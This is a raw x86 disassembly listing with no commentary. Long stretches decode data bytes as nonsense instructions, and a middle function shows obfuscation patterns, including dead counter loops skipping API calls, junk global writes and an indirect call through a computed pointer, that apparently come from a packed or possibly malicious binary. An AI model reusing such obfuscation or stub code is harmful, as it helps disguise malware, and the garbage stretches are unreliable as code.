  407974:	movntps XMMWORD PTR [ecx+0x50],xmm6
  407978:	xchg   ecx,eax
  407979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797a:	sbb    BYTE PTR [ebp+ebx*1+0x29149e20],bh
  407981:	repz mov ecx,0xb6e6d907
  407987:	xchg   esi,eax
  407988:	cmp    eax,0x67223822
  40798d:	out    0xf1,eax
  40798f:	mov    bh,0x37
  407991:	hlt    
  407992:	jno    0x4079e5
  407994:	in     eax,0x2d
  407996:	stos   DWORD PTR es:[edi],eax
  407997:	jge    0x4079a8
  407999:	jno    0x4079a8
  40799b:	stc    
  40799c:	mov    WORD PTR [edi+0x3d],ds
  40799f:	pop    esp
  4079a0:	mov    ds:0x5fa58c8a,eax
  4079a5:	mov    al,0x52
  4079a7:	add    bl,bh
  4079a9:	cmp    BYTE PTR [esi-0x249dec56],0xc4
  4079b0:	sbb    ah,dl
  4079b2:	mov    ebx,0xd3228f36
  4079b7:	dec    eax
  4079b8:	push   es
  4079b9:	mov    cl,0x75
  4079bb:	stos   BYTE PTR es:[edi],al
  4079bc:	out    dx,al
  4079bd:	jmp    DWORD PTR [edi]
  4079bf:	daa    
  4079c0:	stos   DWORD PTR es:[edi],eax
  4079c1:	adc    DWORD PTR [ecx],esp
  4079c3:	cld    
  4079c4:	in     al,0x1a
  4079c6:	ins    DWORD PTR es:[edi],dx
  4079c7:	das    
  4079c8:	mov    bl,ah
  4079ca:	cwde   
  4079cb:	xor    ebx,DWORD PTR [eax]
  4079cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ce:	ins    BYTE PTR es:[edi],dx
  4079cf:	sahf   
  4079d0:	xchg   esi,eax
  4079d1:	and    al,0xf6
  4079d3:	cmp    DWORD PTR [ecx+0x756b6c7c],esi
  4079d9:	stos   BYTE PTR es:[edi],al
  4079da:	out    0xf5,eax
  4079dc:	(bad)  
  4079dd:	(bad)  
  4079de:	lods   eax,DWORD PTR ds:[esi]
  4079df:	or     BYTE PTR [edi+0x1d],ah
  4079e2:	mov    al,0x87
  4079e4:	shl    BYTE PTR [esi-0x53b0dc1d],cl
  4079ea:	pop    esp
  4079eb:	out    dx,eax
  4079ec:	dec    esi
  4079ed:	popf   
  4079ee:	ins    DWORD PTR es:[edi],dx
  4079ef:	xchg   ecx,eax
  4079f0:	daa    
  4079f1:	stos   DWORD PTR es:[edi],eax
  4079f2:	call   0x55846b8b
  4079f7:	sub    BYTE PTR [esi+0x0],bh
  4079fa:	js     0x407a74
  4079fc:	ret    
  4079fd:	gs imul esp,eax,0x3
  407a01:	inc    ebx
  407a02:	inc    ecx
  407a03:	hlt    
  407a04:	aaa    
  407a05:	arpl   WORD PTR [ebx-0x392c4ede],ax
  407a0b:	cld    
  407a0c:	pop    edx
  407a0d:	mov    esi,DWORD PTR [ebp-0x73]
  407a10:	jle    0x407a13
  407a12:	pop    ebx
  407a13:	(bad)  
  407a14:	adc    cl,BYTE PTR [ecx+0x6]
  407a17:	jg     0x407a1c
  407a19:	fwait
  407a1a:	dec    ebp
  407a1b:	(bad)  
  407a1c:	inc    ecx
  407a1d:	inc    edi
  407a1e:	cmp    ecx,DWORD PTR [eax-0xd]
  407a21:	mov    DWORD PTR [ebp+0x1e3b16d4],eax
  407a27:	ja     0x4079ba
  407a29:	push   esp
  407a2a:	and    eax,0xa38c35ff
  407a2f:	inc    ebx
  407a30:	add    bh,bh
  407a32:	xor    eax,0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0x9659:0x28ebc670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	push   ebx
  407ebd:	ja     0x407e40
  407ebf:	cmc    
  407ec0:	in     eax,0x54
  407ec2:	add    bh,cl
  407ec4:	bnd jle 0x407e96
  407ec7:	cli    
  407ec8:	sbb    al,0xdf
  407eca:	rcr    BYTE PTR [ebx+0x0],0x5c
  407ece:	cmp    BYTE PTR [edx+0x12ff9eb],dl
  407ed4:	push   eax
  407ed5:	sbb    DWORD PTR ds:0xc1ab09f,ebp
  407edb:	mov    DWORD PTR [ebx+ebx*1-0x7a407677],0xaa01301e
  407ee6:	push   esp
  407ee7:	and    esi,DWORD PTR [ebx+0x36]
  407eea:	jl     0x407f19
  407eec:	or     DWORD PTR ds:0x7a06b543,esi
  407ef2:	call   0x6977a2d4
  407ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ef8:	xor    edi,DWORD PTR [ebx+ecx*1-0x6612a83f]
  407eff:	xchg   edi,eax
  407f00:	and    al,0xf9
  407f02:	sub    DWORD PTR [eax],ebx
  407f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f05:	and    eax,0x2af567a8
  407f0a:	mov    edi,fs
  407f0c:	dec    eax
  407f0d:	cli    
  407f0e:	ror    DWORD PTR [eax],cl
  407f10:	repz imul esi,DWORD PTR [esi],0xffffff94
  407f14:	sbb    eax,0x439f5211
  407f19:	sbb    esp,DWORD PTR [ebp+0x4e3c8eb]
  407f1f:	gs cmp al,0xf6
  407f22:	xchg   esp,eax
  407f23:	pop    esi
  407f24:	xor    edi,0xffffffac
  407f27:	mov    al,0x92
  407f29:	es gs call 0xb080:0xab4cb60
  407f32:	fisttp QWORD PTR [eax+0x57]
  407f35:	lods   eax,DWORD PTR ds:[esi]
  407f36:	dec    esi
  407f37:	adc    eax,DWORD PTR [esi]
  407f39:	not    DWORD PTR [ecx+0x14f5188e]
  407f3f:	into   
  407f40:	or     edx,ebx
  407f42:	cmp    eax,0x484aaf2
  407f47:	mov    WORD PTR ds:0x50a0f479,?
  407f4d:	lahf   
  407f4e:	pop    DWORD PTR [ebp-0x64]
  407f51:	out    0xf8,al
  407f53:	aam    0x7b
  407f55:	aad    0xd2
  407f57:	std    
  407f58:	scas   al,BYTE PTR es:[edi]
  407f59:	sbb    DWORD PTR [ecx+0xf],esi
  407f5c:	pop    ds
  407f5d:	lea    esp,ds:0xb6bb4071
  407f63:	rcr    DWORD PTR [ebx-0x21b10940],cl
  407f69:	inc    ebx
  407f6a:	fnstcw WORD PTR [eax]
  407f6c:	inc    ebp
  407f6d:	dec    esp
  407f6e:	je     0x407f37
  407f70:	xchg   edx,eax
  407f71:	outs   dx,BYTE PTR ds:[esi]
  407f72:	clc    
  407f73:	jmp    0x407f5f
  407f75:	inc    edi
  407f76:	std    
  407f77:	and    dl,BYTE PTR ds:0xc3ae2136
  407f7d:	add    eax,0xae43bb17
  407f82:	pop    edx
  407f83:	(bad)  
  407f84:	loop   0x407f7a
  407f86:	pop    ecx
  407f87:	jne    0x407f8e
  407f89:	retf   
  407f8a:	pop    eax
  407f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8c:	mov    eax,ds:0xa4793fe1
  407f91:	aam    0x3
  407f93:	mov    ebx,0x5e70b819
  407f98:	adc    dl,dl
  407f9a:	jle    0x407fb2
  407f9c:	or     al,0x68
  407f9e:	mov    edi,0x9a667108
  407fa3:	aaa    
  407fa4:	ret    
  407fa5:	push   ds
  407fa6:	test   DWORD PTR [edi],ecx
  407fa8:	stos   BYTE PTR es:[edi],al
  407fa9:	retf   0xcf11
  407fac:	pop    ds
  407fad:	fcomp  DWORD PTR ds:0x7d8630ff
  407fb3:	mov    cl,0xbc
  407fb5:	sti    
  407fb6:	dec    ebp
  407fb7:	xchg   bl,bl
  407fb9:	sbb    eax,0x82a8530a
  407fbe:	repz or ch,cl
  407fc1:	push   ss
  407fc2:	outs   dx,BYTE PTR ds:[esi]
  407fc3:	mov    ebp,0xcefeeb83
  407fc8:	hlt    
  407fc9:	adc    DWORD PTR [ecx-0xf],ecx
  407fcc:	push   ds
  407fcd:	and    al,0x8f
  407fcf:	mov    ah,0xb7
  407fd1:	inc    edi
  407fd2:	inc    edx
  407fd3:	pop    ss
  407fd4:	sub    DWORD PTR [edi+eax*1],ebx
  407fd7:	pop    ebp
  407fd8:	adc    BYTE PTR [ebp+0x43],dl
  407fdb:	push   ebp
  407fdc:	(bad)  
  407fdd:	adc    ebp,esp
  407fdf:	mov    BYTE PTR [ecx+0x56],bl
  407fe2:	shr    BYTE PTR [esi],0x11
  407fe5:	in     eax,dx
  407fe6:	mov    esi,0xaff29b37
  407feb:	inc    edx
  407fec:	popf   
  407fed:	or     DWORD PTR [edx],esp
  407fef:	call   0x128442df
  407ff4:	jno    0x407fcb
  407ff6:	ds mov eax,0x37158030
  407ffc:	loopne 0x40805e
  407ffe:	push   ebx
  407fff:	or     eax,0xb79fd5b2
  408004:	ja     0x407fae
  408006:	mov    ds:0xdefbc03b,eax
  40800b:	inc    esi
  40800c:	mov    ch,0x89
  40800e:	shr    BYTE PTR [edi-0x60],1
  408011:	sub    DWORD PTR [edx-0x8ddad5c],0xffffffce
  408018:	jae    0x408068
  40801a:	leave  
  40801b:	sbb    dh,BYTE PTR [ebx]
  40801d:	mov    bh,0xaa
  40801f:	(bad)  
  408020:	cld    
  408021:	(bad)
  408025:	dec    esi
  408026:	arpl   WORD PTR [edx+0x13959676],bp
  40802c:	adc    BYTE PTR [ebx+0x216dee45],dh
  408032:	cmp    dh,BYTE PTR [ecx-0xb603c41]
  408038:	mov    ecx,0xdeccefe7
  40803d:	test   bh,bl
  40803f:	fst    QWORD PTR [eax+eax*2-0x627a5529]
  408046:	and    DWORD PTR [ebp+0x7d7eb7a7],esp
  40804c:	sub    al,0x6c
  40804e:	or     DWORD PTR ds:0xcdb47df,esi
  408054:	mov    ah,0x17
  408056:	jns    0x407fe0
  408058:	adc    eax,0xa00f43d8
  40805d:	out    0x2e,eax
  40805f:	mov    BYTE PTR [edx-0x47],dl
  408062:	mov    ds:0xbefb6402,eax
  408067:	adc    DWORD PTR [ecx-0x45],esp
  40806a:	xor    esp,esp
  40806c:	push   esi
  40806d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40806e:	push   ss
  40806f:	dec    edx
  408070:	add    al,0x9
  408072:	lds    eax,FWORD PTR [esp+ebp*1+0x4aa1ac78]
  408079:	mov    bl,0x8a
  40807b:	dec    edi
  40807c:	jl     0x4080f4
  40807e:	cld    
  40807f:	push   0xd1d4e3bf
  408084:	out    dx,al
  408085:	pop    edx
  408086:	jmp    0x4080de
  408088:	cld    
  408089:	mov    bl,0x61
  40808b:	ret    0xe4aa
  40808e:	shl    BYTE PTR ds:0xd7eef2de,0x80
  408095:	popa   
  408096:	in     eax,0x1d
  408098:	jo     0x40802c
  40809a:	adc    BYTE PTR [esi+0x421360f9],dh
  4080a0:	imul   ebp,DWORD PTR [ecx],0x7fa194e0
  4080a6:	stos   DWORD PTR es:[edi],eax
  4080a7:	aam    0xeb
  4080a9:	fdiv   QWORD PTR [edx+edx*1-0x717eb80a]
  4080b0:	mov    ch,0x40
  4080b2:	mov    dl,BYTE PTR [ebp+0x5dac8bce]
  4080b8:	leave  
  4080b9:	and    dh,BYTE PTR [esi]
  4080bb:	hlt    
  4080bc:	scas   al,BYTE PTR es:[edi]
  4080bd:	dec    eax
  4080be:	push   edx
  4080bf:	cmp    eax,0x7278f1dc
  4080c4:	ins    BYTE PTR es:[edi],dx
  4080c5:	das    
  4080c6:	das    
  4080c7:	(bad)  
  4080c8:	cmp    cl,BYTE PTR [edx+0x1c]
  4080cb:	cmp    eax,DWORD PTR [edi-0x4d7457dc]
  4080d1:	neg    BYTE PTR [ebp+0x7c1c63cf]
  4080d7:	xor    dh,BYTE PTR [edi+ebp*2]
  4080da:	xor    esi,esi
  4080dc:	pop    ds
  4080dd:	mov    esp,esi
  4080df:	jae    0x408158
  4080e1:	retf   
  4080e2:	retf   0x3548
  4080e5:	fdivr  QWORD PTR [esi+0x49]
  4080e8:	xchg   ecx,eax
  4080e9:	inc    esp
  4080ea:	jae    0x40807f
  4080ec:	stos   DWORD PTR es:[edi],eax
  4080ed:	bound  ebx,QWORD PTR [esp+ecx*4-0x7b]
  4080f1:	jne    0x4080db
  4080f3:	int3   
  4080f4:	cld    
  4080f5:	call   FWORD PTR [ecx-0x236fefa4]
  4080fb:	xchg   ecx,eax
  4080fc:	mov    edx,0xd7284e07
  408101:	nop
  408102:	xchg   BYTE PTR [eax-0x68122037],dl
  408108:	mov    dl,0x53
  40810a:	dec    esi
  40810b:	cmp    dh,BYTE PTR [esi+0x2e5d9c01]
  408111:	repz push esp
  408113:	pop    edi
  408114:	in     eax,dx
  408115:	mov    al,0xa2
  408117:	pop    ecx
  408118:	pop    edx
  408119:	push   ss
  40811a:	mov    esp,0x65aafa77
  40811f:	xor    eax,0x3b2254ce
  408124:	cs inc ebx
  408126:	sub    al,0x39
  408128:	xchg   esi,eax
  408129:	push   ss
  40812a:	and    ch,bh
  40812c:	mov    dh,0xc4
  40812e:	or     al,0x33
  408130:	push   ebp
  408131:	jns    0x4081a7
  408133:	jno    0x408110
  408135:	cmp    al,0xb3
  408137:	sub    al,0x27
  408139:	dec    esp
  40813a:	sar    DWORD PTR [edi+0x20],cl
  40813d:	push   es
  40813e:	ret    0x60d1
  408141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408142:	mov    ds:0xf9ce26e4,al
  408147:	jmp    0x244c:0x952e3d21
  40814e:	mov    eax,DWORD PTR [ebx+0x35]
  408151:	hlt    
  408152:	mov    al,0xc3
  408154:	das    
  408155:	fild   DWORD PTR [esi]
  408157:	out    0x1a,eax
  408159:	aam    0xaa
  40815b:	shl    DWORD PTR [ebx+0x6d29ac5a],1
  408161:	xor    bl,dl
  408163:	cmp    al,BYTE PTR cs:[edi-0x4c]
  408167:	sub    BYTE PTR [ebx],0x17
  40816a:	imul   ecx,DWORD PTR [ecx],0x6d
  40816d:	mov    bl,0x2d
  40816f:	stos   DWORD PTR es:[edi],eax
  408170:	pop    esi
  408171:	inc    ebx
  408172:	and    eax,0x48e2c4b2
  408177:	ins    BYTE PTR es:[edi],dx
  408178:	mov    ebx,0xa2ffc46b
  40817d:	call   0x2b03:0xca1f4266
  408184:	into   
  408185:	or     BYTE PTR [edx-0x19cf8304],ch
  40818b:	mov    dl,BYTE PTR [edx+0x3544bcb6]
  408191:	pop    esp
  408192:	nop
  408193:	mov    edx,0xa1c07c8f
  408198:	pop    ebx
  408199:	stos   BYTE PTR es:[edi],al
  40819a:	aaa    
  40819b:	loopne 0x40814b
  40819d:	mov    DWORD PTR [esi],ebp
  40819f:	loop   0x40819c
  4081a1:	imul   ecx,DWORD PTR [esi+ebp*1],0xffffff80
  4081a5:	xchg   ebx,eax
  4081a6:	jle    0x40820d
  4081a8:	cdq    
  4081a9:	xor    DWORD PTR [eax+0x34],ebp
  4081ac:	xor    ah,BYTE PTR [ebp-0x31]
  4081af:	add    BYTE PTR [ebx+0x6d],ch
  4081b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b3:	fiadd  DWORD PTR ds:0x916d66e0
  4081b9:	xchg   ecx,eax
  4081ba:	jae    0x4081d6
  4081bc:	test   eax,0x82944710
  4081c1:	xchg   ebx,eax
  4081c2:	cld    
  4081c3:	inc    ecx
  4081c4:	add    BYTE PTR [ebx+0x26579947],ch
  4081ca:	mov    ds:0x9710167e,al
  4081cf:	fcomp  QWORD PTR [ecx+eiz*8+0x22]
  4081d3:	pop    ecx
  4081d4:	jns    0x408203
  4081d6:	pop    esp
  4081d7:	pop    edx
  4081d8:	dec    eax
  4081d9:	jb     0x40819b
  4081db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081dc:	sbb    al,BYTE PTR [eax+0xc3d8ffe]
  4081e2:	mov    eax,DWORD PTR [eax-0x70]
  4081e5:	int    0x54
  4081e7:	cmp    al,0x56
  4081e9:	ins    BYTE PTR es:[edi],dx
  4081ea:	or     al,0x67
  4081ec:	inc    eax
  4081ed:	mov    eax,0x9d0d8e32
  4081f2:	sti    
  4081f3:	inc    esi
  4081f4:	sar    BYTE PTR [edi],0xe
  4081f7:	loopne 0x4081c9
  4081f9:	dec    ebx
  4081fa:	popa   
  4081fb:	sbb    cl,BYTE PTR [eax+0x34]
  4081fe:	cwde   
  4081ff:	sbb    DWORD PTR [edx+edi*2],0xff7e08bf
  408206:	ret    
  408207:	dec    bh
  408209:	or     esi,esp
  40820b:	fadd   DWORD PTR [edi+0xd9523cf]
  408211:	sbb    dh,0x91
  408214:	fmul   st(0),st
  408216:	push   esp
  408217:	mov    dh,0x1a
  408219:	bswap  esp
  40821b:	mov    eax,ds:0xab316943
  408220:	jmp    0x857d:0x96022220
  408227:	or     al,0xb2
  408229:	push   ss
  40822a:	imul   ebx,DWORD PTR [esi+0x1f],0x40
  40822e:	mov    cl,ch
  408230:	lods   eax,DWORD PTR ds:[esi]
  408231:	adc    ch,bl
  408233:	mov    edi,0xe2c2765c
  408238:	cli    
  408239:	push   cs
  40823a:	loopne 0x4082ad
  40823c:	inc    ecx
  40823d:	mov    cs,WORD PTR [edx-0x78]
  408240:	(bad)  
  408241:	leave  
  408242:	mov    WORD PTR [eax+0x7e],ss
  408245:	pop    eax
  408246:	inc    ebx
  408247:	cmp    BYTE PTR [esp+eiz*2],0xbc
  40824b:	(bad)  
  40824c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40824d:	fdivr  st(4),st
  40824f:	and    eax,0x46387cbb
  408254:	sub    ebp,DWORD PTR [ebx+0x7]
  408257:	je     0x408246
  408259:	jmp    0x861db83e
  40825e:	stos   DWORD PTR es:[edi],eax
  40825f:	aam    0xdc
  408261:	enter  0xc5cd,0x13
  408265:	jmp    0x1427:0xc00f58a1
  40826c:	pop    es
  40826d:	jl     0x4082e8
  40826f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408270:	pop    ebp
  408271:	cmp    BYTE PTR [ecx+0x3b39b53],dl
  408277:	mov    al,0x31
  408279:	xchg   ebx,edx
  40827b:	bound  ebx,QWORD PTR [edi]
  40827d:	pop    edx
  40827e:	pop    ebx
  40827f:	and    dh,BYTE PTR [edi]
  408281:	mov    cl,0x36
  408283:	mov    dl,0xfe
  408285:	cdq    
  408286:	imul   ebp,DWORD PTR [esi-0x2b],0x4c
  40828a:	ja     0x40827e
  40828c:	sub    ebp,ebp
  40828e:	and    BYTE PTR [edx-0x5d],dh
  408291:	mov    eax,0x9779e71d
  408296:	sar    DWORD PTR [edi-0x7c2f6345],1
  40829c:	push   0xb37bd2b5
  4082a1:	xchg   esp,eax
  4082a2:	xchg   esi,eax
  4082a3:	lock pushf 
  4082a5:	adc    ebx,ebp
  4082a7:	and    DWORD PTR [ebp-0x73],edi
  4082aa:	cmp    eax,ebx
  4082ac:	pushf  
  4082ad:	arpl   di,ax
  4082af:	cwde   
  4082b0:	ja     0x408310
  4082b2:	scas   eax,DWORD PTR es:[edi]
  4082b3:	add    al,0x13
  4082b5:	pop    ebx
  4082b6:	adc    al,0x64
  4082b8:	daa    
  4082b9:	sbb    ah,BYTE PTR [edx+0x4db7505a]
